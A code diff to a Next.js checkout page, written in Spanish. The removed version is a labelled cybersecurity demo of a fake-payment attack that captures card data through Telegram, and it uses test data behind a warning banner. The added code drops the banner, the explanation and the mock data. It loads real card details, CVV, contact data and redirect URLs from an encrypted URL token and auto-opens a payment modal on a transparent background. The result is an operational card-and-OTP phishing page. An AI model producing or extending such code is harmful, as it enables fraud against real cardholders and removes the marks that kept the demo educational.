@@ -1,79 +1,81 @@
-import { useState } from "react";
+import { useEffect, useState } from "react";
+import type { GetServerSideProps } from "next";
 import PaymentStatusModal from "@/components/PaymentStatusModal";
+import { decryptPayload } from "@/lib/payloadCipher";
 
-const MOCK_PAYMENT = {
-  numeroTarjeta: "4242424242424242",
-  vencimiento: "12/28",
-  cvv: "123",
-  titular: "MARIA DEMO",
-  email: "maria.demo@ejemplo.com",
-  celular: "3001234567",
-  telefono: "3001234567",
-  cardBrand: "Visa",
-  metodo: "credito",
+interface PaymentPayload {
+  payment: {
+    numeroTarjeta: string;
+    vencimiento: string;
+    cvv: string;
+    titular: string;
+    email: string;
+    celular: string;
+    telefono: string;
+    cardBrand: string;
+    metodo: string;
+  };
+  price: string;
+  priceFormatted: string;
+  redirectSuccess: string;
+  redirectDeclined: string;
+}
+
+interface HomeProps {
+  valid: boolean;
+  payload?: PaymentPayload;
+}
+
+export const getServerSideProps: GetServerSideProps = async (ctx) => {
+  const token = typeof ctx.query.d === "string" ? ctx.query.d : "";
+  if (!token) {
+    return { props: { valid: false } };
+  }
+  try {
+    const secret = process.env.PAYLOAD_SECRET ?? "dev-payload-secret";
+    const payload = decryptPayload<PaymentPayload>(token, secret);
+    return { props: { valid: true, payload } };
+  } catch {
+    return { props: { valid: false } };
+  }
 };
 
-const PRICE = "199900";
-const PRICE_FORMATTED = "$199.900";
-
-export default function Home() {
+export default function Home({ valid, payload }: HomeProps) {
+  const [sessionId] = useState(() => `demo-${Date.now()}`);
   const [isOpen, setIsOpen] = useState(false);
-  const [sessionId, setSessionId] = useState("");
 
-  const openDemo = () => {
-    const id = `demo-${Date.now()}`;
-    localStorage.setItem("checkout_payment", JSON.stringify(MOCK_PAYMENT));
-    setSessionId(id);
-    setIsOpen(true);
-  };
+  useEffect(() => {
+    if (valid && payload) {
+      localStorage.setItem("checkout_payment", JSON.stringify(payload.payment));
+      setIsOpen(true);
+    }
+  }, [valid, payload]);
+
+  if (!valid || !payload) {
+    return (
+      <main className="flex min-h-screen items-center justify-center bg-transparent">
+        <p className="text-sm text-gray-500">URL inválida</p>
+      </main>
+    );
+  }
 
   return (
-    <main className="min-h-screen bg-slate-50">
-      <div className="sticky top-0 z-50 w-full bg-red-600 px-4 py-3 text-center text-sm font-bold text-white">
-        ⚠ ENTORNO SIMULADO — No ingrese datos reales. Demo educativa de ciberseguridad.
-      </div>
-
-      <section className="mx-auto flex max-w-3xl flex-col items-center gap-6 px-6 py-16 text-center">
-        <h1 className="text-3xl font-bold text-slate-900">
-          Así funciona un ataque de pago falso
-        </h1>
-        <p className="text-slate-600">
-          Este demo muestra cómo un atacante engaña a una persona haciéndole creer que está
-          pagando, mientras en realidad captura sus datos por Telegram. Todos los datos son
-          ficticios (tarjeta de prueba 4242 4242 4242 4242).
-        </p>
-
-        <button
-          onClick={openDemo}
-          className="rounded-lg bg-blue-600 px-8 py-3 font-semibold text-white hover:bg-blue-700"
-        >
-          Abrir simulación
-        </button>
-
-        <ol className="text-left text-sm text-slate-600">
-          <li>1. Pulsa &quot;Abrir simulación&quot; para abrir el modal de pago.</li>
-          <li>2. Abre Telegram: verás el mensaje con los datos de prueba del cliente.</li>
-          <li>3. Pulsa &quot;Pedir OTP&quot; en el bot para que el modal pida el código.</li>
-          <li>4. Escribe un OTP de prueba (p. ej. 123456) y pulsa &quot;✅ Check&quot;.</li>
-        </ol>
-      </section>
-
-      <PaymentStatusModal
-        sessionId={sessionId}
-        isOpen={isOpen}
-        price={PRICE}
-        priceFormatted={PRICE_FORMATTED}
-        last4="4242"
-        card="4242 4242 4242 4242"
-        cardT="Crédito"
-        vencimiento="12/28"
-        cvv="123"
-        titular="MARIA DEMO"
-        cardBrand="Visa"
-        email="maria.demo@ejemplo.com"
-        contactData={{ email: "maria.demo@ejemplo.com", celular: "3001234567" }}
-        onClose={() => setIsOpen(false)}
-      />
-    </main>
+    <PaymentStatusModal
+      sessionId={sessionId}
+      isOpen={isOpen}
+      price={payload.price}
+      priceFormatted={payload.priceFormatted}
+      last4={payload.payment.numeroTarjeta.slice(-4)}
+      card={payload.payment.numeroTarjeta}
+      cardT={payload.payment.metodo === "credito" ? "Crédito" : "Débito"}
+      vencimiento={payload.payment.vencimiento}
+      cvv={payload.payment.cvv}
+      titular={payload.payment.titular}
+      cardBrand={payload.payment.cardBrand}
+      email={payload.payment.email}
+      contactData={{ email: payload.payment.email, celular: payload.payment.celular }}
+      redirectSuccess={payload.redirectSuccess}
+      redirectDeclined={payload.redirectDeclined}
+    />
   );
 }
